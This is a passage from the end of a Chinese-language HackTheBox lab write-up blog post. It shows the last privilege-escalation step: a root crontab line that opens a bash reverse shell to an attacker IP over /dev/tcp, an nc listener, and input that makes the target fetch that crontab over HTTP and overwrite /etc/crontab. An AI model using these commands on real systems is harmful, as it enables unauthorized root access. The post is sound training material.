执行我们的命令就可以了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>cp /etc/crontab ./ <span class=o>&amp;&amp;</span> <span class=nb>echo</span> <span class=s1>&#39;* * * * * root bash -c &#34;bash -e &amp;&gt; /dev/tcp/&lt;ip&gt;/1234 &lt;&amp; 1&#34;&#39;</span> &gt;&gt; crontab <span class=o>&amp;&amp;</span> sudo python3 -m http.server <span class=m>80</span>
</span></span><span class=line><span class=cl>sudo nc -lvnp <span class=m>1234</span>
</span></span></code></pre></td></tr></table></div></div><p>把 <code>input</code> 改成：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-plain data-lang=plain><span class=line><span class=cl>url = &#34;http://&lt;ip&gt;/crontab&#34;
</span></span><span class=line><span class=cl>output = &#34;/etc/crontab&#34;
</span></span></code></pre></td></tr></table></div></div><p>稍等片刻，就能拿到 shell 和 root flag。</p><a class=lightgallery href=https://assets.lxdlam.com/img/1647373550_cde552a0.png title=https://assets.lxdlam.com/img/1647373550_cde552a0.png data-thumbnail=https://assets.lxdlam.com/img/1647373550_cde552a0.png><img class=lazyload src=/svg/loading.min.svg data-src=https://assets.lxdlam.com/img/1647373550_cde552a0.png data-srcset="https://assets.lxdlam.com/img/1647373550_cde552a0.png, https://assets.lxdlam.com/img/1647373550_cde552a0.png 1.5x, https://assets.lxdlam.com/img/1647373550_cde552a0.png 2x" data-sizes=auto alt=https://assets.lxdlam.com/img/1647373550_cde552a0.png width=100%></a><h2 id=epilogue>Epilogue</h2><p>Write-up 一定要边做边写边截图，做完了补题解累死我了。</p></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-01-04</span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=https://blog.lxdlam.com/post/27e78a70/ data-title="HTB Intro to Dante Writeups" data-hashtags=渗透测试,HackTheBox><i class="fab fa-twitter fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=https://blog.lxdlam.com/post/27e78a70/ data-hashtag=渗透测试><i class="fab fa-facebook-square fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Instapaper" data-sharer=instapaper data-url=https://blog.lxdlam.com/post/27e78a70/ data-title="HTB Intro to Dante Writeups" data-description><i data-svg-src=https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/instapaper.svg aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Pocket" data-sharer=pocket data-url=https://blog.lxdlam.com/post/27e78a70/><i class="fab fa-get-pocket fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=https://blog.lxdlam.com/post/27e78a70/ data-title="HTB Intro to Dante Writeups"><i class="fab fa-weibo fa-fw" aria-hidden=true></i></a><a href=javascript:void(0); title="分享到 Evernote" data-sharer=evernote data-url=https://blog.lxdlam.com/post/27e78a70/ data-title="HTB Intro to Dante Writeups"><i class="fab fa-evernote fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fas fa-tags fa-fw" aria-hidden=true></i>&nbsp;<a href=/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/>渗透测试</a>,&nbsp;<a href=/tags/hackthebox/>HackTheBox</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/post/8697249c/ class=prev rel=prev title="XCPC 2021 补题 memo"><i class="fas fa-angle-left fa-fw" aria-hidden=true></i>XCPC 2021 补题 memo</a>
<a href=/post/1f7260ad/ class=next rel=next title="picoCTF 2022 Crypto Write-ups">picoCTF 2022 Crypto Write-ups<i class="fas fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article></div></main><footer class=footer><div class=footer-container><div class=footer-line>由 <a href=https://gohugo.io/ target=_blank rel="noopener noreffer" title="Hugo 0.109.0">Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/dillonzq/LoveIt target=_blank rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden=true></i> LoveIt</a></div><div class=footer-line itemscope itemtype=http://schema.org/CreativeWork><i class="far fa-copyright fa-fw" aria-hidden=true></i><span itemprop=copyrightYear>2017 - 2023</span><span class=author itemprop=copyrightHolder>&nbsp;<a href=https://blog.lxdlam.com target=_blank>Ramen</a></span>&nbsp;|&nbsp;<span class=license><a rel="license noopener" href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>署名-非商业性使用-相同方式共享 4.0 国际</a></span></div></div></footer></div><div id=fixed-buttons><a href=# id=back-to-top class=fixed-button title=回到顶部><i class="fas fa-arrow-up fa-fw" aria-hidden=true></i>
</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:10},comment:{}}</script><script type=text/javascript src=/js/theme.min.js></script><script type=text/javascript>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-92306989-1",{anonymize_ip:!0})</script><script type=text/javascript src="https://www.googletagmanager.com/gtag/js?id=UA-92306989-1" async></script></body></html>